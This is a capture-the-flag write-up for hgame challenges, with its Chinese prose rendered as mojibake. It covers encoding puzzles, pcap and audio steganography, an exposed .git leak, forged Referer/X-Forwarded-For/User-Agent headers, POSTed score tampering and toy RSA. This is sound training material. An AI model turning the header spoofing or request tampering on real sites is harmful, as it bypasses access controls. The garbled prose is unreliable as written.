UDRPJ2W4UKUJFXDQVKNKI3HATZULJUGUQTLKVHDANKILJXXA22SFNFVOSJPKVIGGTKRNBTXS4KPGZSEITLZLB4VC6CIOJVWE4DOI5GUWUKRLBMG4ZCHNFWVESBUN5MWUMKTHF3XQRCHIRFW6N3QO5HXUWSUJFCDAV3TKIVXCZKZKFUEIQTUK5SDANSHLJCXM3LINFIFMSJTMJIDEWBVMRIEKTZSI5XE23RRMQ4WKMKXHFZVET3BLBBE2SKSNJRWSYSYMY4DC6CZM5TVSULLOJHTKUDROZHVKNCNIFKU4SLZLJWGGL32LBEGSU2GM5BUG2ZVNMVXKLZVNJTXQQSBO5UEUV3EPEXWIY3DJI2GCQKJMFKGWVCLG4XW25KQIVCUIQ2FNRFHUSRZKY4XU3SCM5BWQ4CDKNGTO3RLME2DI6RRKJBW2RBYOJ4EQUCVNY2SW6LVGY2FGWSPHBAVC2DJPJEDSST2MRSFUMDXMN3WGWLXOBCGY3KKGZ5HKNRUKRNHKNCBKF4GS6KIJZHHUZDUMQYXO43XMRMUC2CENRWU4NT2OU3DMVDQNE2UC53YNB4UQSSNPI4WYZBRO5VXUZBUIFUEIRTNJ43FI3JXGZ5HA2BVM42HO2CDJBGE2VBRNZSDCMDOPJHHOQTINJBGWT3BMJXDOSZXOJUEU2ZXO5BEGR2MJVTDA3SOGEYW4VCCPJBDKNTTIY4EG2JPKZRGENKQOBKDMM3RGFITIVZRLBTTERZYIZ2HI2ZLORIHEULUIRBUCQSEFNFTEMTZMZLW4MLPKVUEESKBNAXUMYTCGVIHAVBWHBEVCQLTIFIWM4LUORRXMMTQMRLUKSKBK5AUS5RZKUZHKZRXKV2WUQ2FIFCEGRJTGJYWEWCIHFYVQUTIINAUE2SDMI3VMTTSNIVTCTDHO5UECQL2NB2DS33NGE2TSYLMHF3VC3CNJU4DIWCWOI2XGQSSNUYE4L3EK4ZHAYRXOZIEOOCSO5UU642ZOBUEUSDCKE3TSMLCK5WHM5JQFNRHQRCEJFQTK2TNIVXWG5CUNYYFMOLFK4VXEYRXOZCUKTLIG5UU6WKTOB4DCT3CKFMDCMLCGZ2HM5JYO5MXQSCPJE3GQ4LOIVKVU5CEMYZVM5DRK4VTO6TYOZCWGSLKOJDUWWKTKIZDATZPMRLTC4DCG52FA3JYKF3XSR3VLE2WQS2IJRKTKOKGMZMGY5TRGIVTO6CCIREWKNDKNVCXCY3EKRWTARRZMRLSW4TCG53E2R2NKJ5GST3PMFYHQRSHMJITGOJRMJQWY5TVHA4GE6CIINETM6DJNVCWWZDUIR3DGVTUMFLSWN2UGRSDI4LBKNSWOVDRFNUDANLVGJHXA5KVKV5EIT2FIJUG4RCXMNUXKNKSKRGU2NCRI5DWGTS2PFFTO3CGJV3XU2CBLFNHOMLOJFZHKVKVPJCE6RKCNBXEIV3DNF2TKUSUJVGTIUKHI5RU4WTZJM3WYRSNO55GQQKZLJ3TC3SJOJ2VKVL2IRHUKQTINZCFOY3JOU2VEVCNJU2FCR2HMNHFU6KLG5WEMTLXPJUECWK2O4YW4SLSOVKVO6TENNHFCTDNGN4WG2LUPJYXK5BTMFFHIYLGG5FG2M3GOF3GQU2HKU4WC3SNOFQTOZTPK4YXCL3DNVQWIZLVF5DG6WSRGFYWG6LQG5YCW2BXMFYDSU3EOIYXCMZPK5UGQQ2XLIXUW3SPOI3EQZDRNUYXAK3TK5RGMK3BGJCUSWSYGBYWGNTSOJSDE2LCK5XCW6K2OQZTM4RUKVUGYUCXOB5EW3LVGM3EM5DBOYZUU3LOLBZHM6DBI5KU4YLOJVYWKNTGN5STE4LGKVXGCOLBOQXTC32ZKFWG2ZTZOB5HCK3IGNQXA5DBMZZEM3JTF5WXI2CDI5LDSS3OJ5YTMM3EN5WTC4BPONWWEZBLOEVUMSLEIRXHOS3DNNSWKWKPJVAVINSIKBSVKSSNF5RUCWK2IFXCWT3FNN2VGWSPHBAVCNSIKBRVKNKJHBRXOY2ZIFXDET3FGBYVGWRLGRAVCNSEKBRVKOKKHBZXOZCZIFVDAT3FGRYFGWRWGVAXO6KCKBZWGOKKMNVXUZBUIFUDAT3FGRYHSURVGVTTI52CKBXWGOJVKFVXUOLXIJUGYRCVLJ5EY5LHFM3FS4BSOMZXQ5TGLJXFIUSWK5EFOZTZMJTU6ZLGKNUDGTSKNZSDSSSVLFSFMOKKOVGTMNKOI5EGG23VMYZVK3CUNBLFQM3NLF5HE22FMNTHS2JRHFSGSZCOIZLGEZC2PJFXKULYGU4UWTDGGAZFUMBQKZLGQMLOHBWTIRDONYYG6ZD2KNNDGZSTKZDUQVTGKNRGUT3VKRJGQM2KJRXDSMKKKU2FMVRZGVWU2NRVIJEEQODPORTFQWLOKRJFMVZTK5RXS4TLJVSWMU3JGM4U43LEJZDFMWLELIXUU5KBGU2TSS2IMMYHCY3KMFJXC4DHGNEWMWKOOJZDC3RLLBCSWNCFKEZWSULVOBCHKQJQPA3TGZTSOZRXGS3ELFAWOUCVNBTFGZSZIJYHEMLWF5MFKNRUIV3XU2CRMVYEG5LHHB3TOWCYOJ3DQ42KMQ2ES2CQIVUGIU2QMNBHA4RROUXVQYZVGRKTI53IIFSXAQZLNMVXOTCULBZGMODVJI4XOSTIOZAWOZCTJBSEENLKGJ2XMWDGGVMVCN3XKJAWK4CDGZVSW52EKRMHEZRLOU2XQ52KPBVEGZZZKNDGIQRZM4ZHK5SXMY2WGVBXNNJHCQ2MMM4HAV22JN2W45BQGFSWE3ZYGVYWGM2ZK5SDQSSTMFFVQRLTNNFU2MSSGUXVQNKPO52TOSKTNYYUK6KKLE2EKY3UKRXDM5SDLJXGIMSFNZIEWVTNKNUHOTBVJNVE4MDFMMYU6YTTJRHSWRLQJZLFA2KXINBEQYSZGQVXEODOLJMGIZ2KKQ3G2WSFONRUGT2XOB5DSSDMJZ5HKN2DKRXGQS32LJITIRTTNBJG2NSQKBQTGSRSIYZWEQ2VGJYW26CMIZAWU5DPMNTFMNSUOM3XK52FGU2VGTLZK5HUEWCMKU2XK2T2NVYHUZDILIZXO3CKN5YGGU3ZKFXXUWSINY4WM2ZTKA2FGQKJGREFC52DIFCHQZ2DIFEHUQKFIFCGOQJULFAUCQRYO5BECRBUM5BUKQLXIFRU2QKRIEVVSQLHIE4ECRSEIFEUCUBPO5AUM3ZQNBKVU4TIGFWUCQKBIFAUESSSKU2UK4TLJJTWOZZ5HU====== å†base32è§£å¯†å¾—åˆ° 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 ä¸€çœ‹ç»“å°¾==ï¼Œåº”è¯¥æ˜¯base64ç¼–ç ï¼Œäºæ˜¯ç»§ç»­è§£å¯†ã€‚ å™«æ˜¯ä¸ªPNGå›¾ç‰‡ã€‚åŠ ä¸Šå¤´è¡¥å…¨ data:image/png;base64,ã€‚è‰ï¼ˆä¸€ç§æ¤ç‰©ï¼‰ï¼ŒçœŸä¼šç©ï¼Œæ˜¯ä¸ªäºŒç»´ç ã€‚ ï¼ˆä¹Ÿå¯ä»¥base64è§£å¯†åä¿å­˜ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶ç„¶åæ‰“å¼€ã€‚ æ‰«ç å¾—åˆ°flagï¼š hgame{3Nc0dInG_@lL_iN_0Ne!} çœŸçš„ä¼šç©2333ï¼ˆï¼ˆå¥½ï¼Œæˆ‘ä¹Ÿè¦æ•´ä¸€ä¸ªå„ç§ç¼–ç çš„å˜»å˜»å˜» Reference:https://www.qqxiuzi.cn/bianma/kaisamima.phphttps://www.splitbrain.org/services/ook æ¯æ—¥æ¨èå¾—åˆ°ä¸€ä¸ª.pcapngæŠ“åŒ…æ–‡ä»¶ï¼Œç”¨Wiresharkæ‰“å¼€ï¼ŒæŸ¥çœ‹httpï¼Œå‘ç°åº”è¯¥æ˜¯ä¸wordpressåšå®¢ç›¸å…³ã€‚ åˆ©ç”¨â€œæ–‡ä»¶-å¯¼å‡ºå¯¹è±¡-HTTPâ€ï¼Œåˆ†æå…¶ä¸­çš„å¯¹è±¡ã€‚ ç»“åˆé¢˜ç›®æç¤º ObjectNotFoundæ­£å¬ç€ç½‘æ˜“äº‘æ¯æ—¥æ¨èâ€¦ å‘ç°äº†ä¸€ä¸ªä¸Šä¼ çš„ç½‘é¡µâ€”â€” è¿™æ˜¯ä¸€ä¸ªæäº¤çš„è¡¨æ ¼ï¼Œå‘ç°äº†ä¸Šä¼ çš„æ–‡ä»¶ song.zipï¼Œå°†å…¶æå–å‡ºæ¥ã€‚ å‹ç¼©åŒ…é‡Œæœç„¶æ˜¯ä¸€é¦–æ­Œï¼Œä¸”å¤‡æ³¨é‡Œæç¤ºæ˜¯6ä½æ•°å­—ã€‚ è€ƒè™‘åˆ°6ä½æ•°å­—ï¼Œç›´æ¥å°±æš´åŠ›ç ´è§£å¥½äº†ã€‚ï¼ˆå…¶å®è¿˜åœ¨æŠ“åŒ…æ–‡ä»¶é‡Œæ‰¾äº†è€åŠå¤©æ²¡æ‰¾åˆ°ï¼ˆï¼ˆï¼ˆ åˆ©ç”¨å£ä»¤759371è§£å‹å¾—åˆ°mp3æ–‡ä»¶ã€‚ ä¸€å¼€å§‹æ‰“å¼€010editoræ‰¾ï¼Œæ²¡æœ‰ã€‚ foremostæå–å¾—åˆ°äº†å°é¢å›¾ï¼Œä¹Ÿæ²¡æœ‰éšå†™ã€‚ çœ‹æ¥åœ¨éŸ³é¢‘é‡Œäº†ï¼ŒçŒœæƒ³å°±æ˜¯éŸ³é¢‘éšå†™å˜›ã€‚ æ—¢ç„¶æ˜¯MP3ï¼Œå…ˆè¯•è¯•MP3StegoDecodeï¼Œç»“æœä¹ˆå¾—ã€‚ the bit stream file I Love Mondays.mp3 is a BINARY file HDR: s=FFF, id=1, l=1, ep=on, br=4, sf=3, pd=0, pr=0, m=0, js=0, c=0, o=0, e=0 alg.=MPEG-1, layer=I, tot bitrate=128, sfrq=0.0 mode=stereo, sblim=32, jsbd=32, ch=2 [Frame 3]OpenTable: could not find tables/huffdec Check local directory './tables/' Please check huffman table 'huffdec' ä¸Šç½‘æ‰¾äº†ä¸€ä¸‹ï¼Œä¸‹äº†ä¸ªéŸ³é¢‘å¤„ç†è½¯ä»¶Audacityã€‚ï¼ˆå…è´¹å¼€æºè·¨å¹³å°ï¼Œè¿˜ä¸é”™ Free, open source, cross-platform audio software. Audacity is an easy-to-use, multi-track audio editor and recorder for Windows, Mac OS X, GNU/Linuxâ€¦ æŸ¥çœ‹é¢‘è°±ï¼Œå¾—åˆ°flagï¼š hgame{I_love_EDM233} Electronic Dance Music ï¼ˆç”µå­èˆæ›²ï¼‰å¯è¿˜è¡Œã€‚ ç¬¬ä¸€æ¬¡åšéŸ³é¢‘éšå†™çš„é¢˜ï¼Œå“‡è„‘æ´çœŸå¤§ï¼Œå¤ªæœ‰æ„æ€äº†233333 WebCosmos çš„åšå®¢http://cosmos.hgame.n3ko.co/ å…ˆåœ¨ç½‘é¡µé‡Œæ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ°emmm åæ¥å‘ç°ï¼Œæ—¢ç„¶è¯´ç‰ˆæœ¬ç®¡ç†å·¥å…·ï¼Œè¿˜æœ‰GitHubå˜›ã€‚ é‚£å°±æ„é€ /.git/configè¯•è¯• æœç„¶â€”â€” [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote \"origin\"] url = https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc fetch = +refs/heads/*:refs/remotes/origin/* å¥½ï¼Œè¿™ä¸ªGitHubä»“åº“æœ‰æˆï¼ è®¿é—®ä¸€æ³¢ï¼Œç„¶ååœ¨commité‡Œæ‰¾åˆ°äº†flagã€‚ base64è§£ç å¾—åˆ°flag hgame{g1t_le@k_1s_danger0us_!!!!} /.gitç›®å½•å…¬å¼€è®¿é—®æ˜¯æŒºå±é™©çš„emmm æ¥ å¤´ éœ¸ ç‹http://kyaru.hgame.n3ko.co/ ç›´æ¥è®¿é—®ï¼Œæç¤º You need to come from https://vidar.club/. å¢åŠ è¯·æ±‚å¤´: Referer: https://vidar.club/ï¼Œé‡å‘åæç¤º You need to visit it locally. å¢åŠ è¯·æ±‚å¤´ï¼šX-Forwarded-For: 127.0.0.1 You need to use Cosmos Brower to visit. æ”¹UAï¼šUser-Agent: Cosmos The flag will be updated after 2077, please wait for it patiently. æ ¹æ®å“åº”å¤´ Last-Modified: Fri, 01 Jan 2077 00:00:00 GMTï¼Œè¿›è¡Œä¿®æ”¹ã€‚æŠŠ If-Unmodified-Since è®¾ç½®åœ¨ Last-Modified ä¹‹åå°±å¯ä»¥äº†ã€‚ å¢åŠ è¯·æ±‚å¤´ï¼šIf-Unmodified-Since: Fri, 01 Jan 2077 00:00:00 GMT å¾—åˆ°flag hgame{W0w!Your_heads_@re_s0_many!} è¿™é¢˜ä¸€æ³¢ä¸‰æŠ˜å•Šã€‚ æœ€åè¿™ä¸ªæ“ä½œè®©æˆ‘æƒ³åˆ°äº†ustcçš„hackgameé‡Œä¿¡æ¯å®‰å…¨ 2077é‚£é“é¢˜ï¼Œç„¶åå›å»çœ‹äº†ä¸€ä¸‹233. Referenceï¼š https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8_2077/README.md ğŸ”å°¼æ³°ç«cxkæœ‰ç‚¹å¥½ç©2333 éšä¾¿ç©äº†ä¸€ä¸‹è§‰å¾—æœ‰ç‚¹æ— èŠï¼ˆx çœ‹äº†ä¸€ä¸‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°æ˜¯ç”¨canvasç”»å¸ƒç”»å‡ºæ¥çš„ï¼Œäº¤äº’ç”¨çš„jsï¼Œæœ‰ç‚¹æ„æ€iã€‚ ç„¶åæ‰“å¼€äº†Burp Suiteï¼ŒæŠ“ä¸ªåŒ…çœ‹çœ‹å§ã€‚ å‘ç°æ¸¸æˆç»“æŸçš„æ—¶å€™ä¼šPOSTå½“å‰å¾—åˆ†ã€‚ ä¸å¤Ÿåˆ™æç¤º Your score must more than 30000 , then you can get the flag. Happy game! é‚£å°±æˆªåŒ…æ”¹åŒ…å¥½äº†å•¦ï¼Œç›´æ¥ç»™ä»–åŠ ä¸ª0. è¿™å°±å‡ºæ¥äº†å‘€ï¼ â€‹ hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!} Code Worldhttp://codeworld.hgame.day-day.work/ å‘ç°é‡å®šå‘åˆ°äº† http://codeworld.hgame.day-day.work/new.php åŒæ—¶çœ‹åˆ°äº†ä¸€å¥js console.log(\"This new site is building....But our stupid developer Cosmos did 302 jump to this page..F**k!\") curlçœ‹äº†ä¸€ä¸‹ä¹‹å‰çš„ç½‘é¡µ405ã€‚ å˜¤ä¸ä¼šäº†ã€‚ã€‚ 20200125æ›´æ–°ï¼š çœ‹äº†å®˜æ–¹WPï¼Œå‘ç°è¦æŠŠè¯·æ±‚æ”¹æˆPOSTå‘åˆ°åŸé¡µé¢ã€‚ äºæ˜¯è¯•äº†ä¸€ä¸‹ï¼Œè¿”å› äººé¸¡éªŒè¯ ç›®å‰å®ƒåªæ”¯æŒé€šè¿‡urlæäº¤å‚æ•°æ¥è®¡ç®—ä¸¤ä¸ªæ•°çš„ç›¸åŠ ï¼Œå‚æ•°ä¸ºa ç°åœ¨,éœ€è¦è®©ç»“æœä¸º10 å†æ„é€ å‚æ•°aï¼Œæ ¹æ®æç¤ºå‚æ•°açš„æäº¤æ ¼å¼ä¸º: ä¸¤æ•°ç›¸åŠ (a=b+c)ï¼Œè€ƒè™‘åˆ°+çš„Urlencodeä¸º%2b äºæ˜¯æ„é€ /?a=2%2b8ï¼Œå¾—åˆ°flag The result is: 10 hgame{C0d3_1s_s0_S@_sO_C0ol!} CryptoInfantRSAé¢˜ç›®ç»™äº†å¦‚ä¸‹çš„ä»£ç â€”â€” #!/usr/bin/env python3 from secret import flag assert flag.startswith(b'hgame{') and flag.endswith(b'}') m = int.from_bytes(flag, byteorder='big') p = 681782737450022065655472455411 q = 675274897132088253519831953441 e = 13 c = pow(m, e, p*q) assert c == 275698465082361070145173688411496311542172902608559859019841 RSAå•¦ã€‚è¿™é‡Œå°±æ ¹æ®å¯†æ–‡CæŠŠæ˜æ–‡Mç»™æ‰¾å‡ºæ¥ã€‚ c = 275698465082361070145173688411496311542172902608559859019841 n = 460390767897997184102969941508880171690097589571068900519251 d = 141658697814768364339375366617699419709389378231351875726277 m = pow(c,d,n) # å¾—åˆ°mä¸º39062110472669388914389428064087335236334831991333245 # å†å°†æ•°å­—mè½¬æ¢ä¸ºå­—ç¬¦ä¸² import binascii flag = binascii.unhexlify(hex(m)[2:]) æˆ–è€… ç”¨ä¸Šé¢çš„å·¥å…·é‡Œçš„Testï¼š å¾—åˆ°flagï¼š hgame{t3Xt6O0k_R5A!!!} Reference: ä»‹ç»RSAçš„https://www.freebuf.com/articles/others-articles/166049.htmlhttps://www.freebuf.com/articles/others-articles/161475.htmlhttps://www.k2zone.cn/?p=2157 Reordernc 47.98.192.231 25002 æ•²ä¸ªå›è½¦å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªä¹±åºçš„å­—ç¬¦ä¸²ï¼Œåˆšå¼€å§‹è¿˜ä»¥ä¸ºæ˜¯åˆ†ç»„æ¥ç€ï¼Œç„¶åè¯•äº†åŠå¤©ä¸å¯¹emmmã€‚ åæ¥æ‰å‘ç°ï¼ŒåŸæ¥æ¯æ¬¡çš„ç»“æœéƒ½ä¸ä¸€æ ·233ï¼Œæ¯”å¦‚ä¸‹é¢æ˜¯ä¸€äº›å®éªŒç»“æœã€‚ Rua!!! $hLjgp+ame{UI5mtA3}u_!iP!RmTn0eT Rua!!! $mtgIUeapjm{h+5LAeT_nTRP!u!m3i0} Rua!!! t5m{ag+eh$UjILmpT0!mP_iR3ATun}e! $mhmjI5te+{apUgLAe3!un0TRimP!T_} mat5jIpmg$heLU{+!PT0un!e_A3R}Tmi {LUpt5mI+e$mgajhm}T!T0!niRAe_Pu3 $Umm+g{LIe5jphtaAT!ei_m}nR0u!3TP 5I{eLmt+ha$mgpjU0nmR}eTi3PA!_!uT Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R æ—¢ç„¶æ˜¯ä¹±åºå§ï¼Œé‚£å°±çœ‹çœ‹åˆ°åº•æ˜¯ä»€ä¹ˆä¸ªé¡ºåºå¥½äº†ï¼ ä¸Šé¢å­—ç¬¦ä¸²çš„é•¿åº¦ä¸º32ï¼Œäºæ˜¯æ„é€ å­—ç¬¦ä¸² str1='123456abcdefghijklmnopqrstuvwxyz' è¾“å…¥åå¾—åˆ° str2='jhca1346ibdefg25zxsqkmnpyrtuvwlo' è¯•äº†å‘ç°è¯¥é¡ºåºä¸å˜ï¼Œäºæ˜¯å¾—åˆ°ç¼–ç çš„å¯¹åº”å…³ç³»ï¼ˆæ­£å˜æ¢é€†å˜æ¢å˜›233333ï¼‰ str1='123456abcdefghijklmnopqrstuvwxyz' print(len(str1)) str2='jhca1346ibdefg25zxsqkmnpyrtuvwlo' # æ­£å˜æ¢ location=list(range(len(str1))) for i in range(len(str2)): location[i]=str1.index(str2[i]) print(location) # [15, 13, 8, 6, 0, 2, 3, 5, 14, 7, 9, 10, 11, 12, 1, 4, 31, 29, 24, 22, 16, 18, 19, 21, 30, 23, 25, 26, 27, 28, 17, 20] # é€†å˜æ¢ ilocation=list(range(len(str1))) for i in range(len(str2)): ilocation[i]=str2.index(str1[i]) print(ilocation) # [4, 14, 5, 6, 15, 7, 3, 9, 2, 10, 11, 12, 13, 1, 8, 0, 20, 30, 21, 22, 31, 23, 19, 25, 18, 26, 27, 28, 29, 17, 24, 16] # éªŒè¯ç»“æœ str3='' for i in location: str3+=str1[i] print(str3) # jhca1346ibdefg25zxsqkmnpyrtuvwlo è¿™é‡Œç”¨åˆ°çš„æ˜¯æ­£å˜æ¢ï¼Œæš´åŠ›ç ´è§£ä¸€æ³¢å§ï¼ str_encrypted = r'Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R' str_decrypted = '' for _ in range(80): for i in location: str_decrypted += str_encrypted[i] print(str_decrypted) str_encrypted = str_decrypted str_decrypted = '' æœ€å¼€å§‹è¯•äº†50æ¬¡æ²¡å‡ºæ¥233ï¼Œåæ¥æŠŠæ•°å­—æ”¹å¤§äº†ä¸€ç‚¹233. ç»ˆäºè·‘å‡ºæ¥äº†ï¼ å¾—åˆ°flagï¼š hgame{jU$t+5ImpL3_PeRmuTATi0n!!} æœç„¶å°±æ’åˆ—å‘—23333 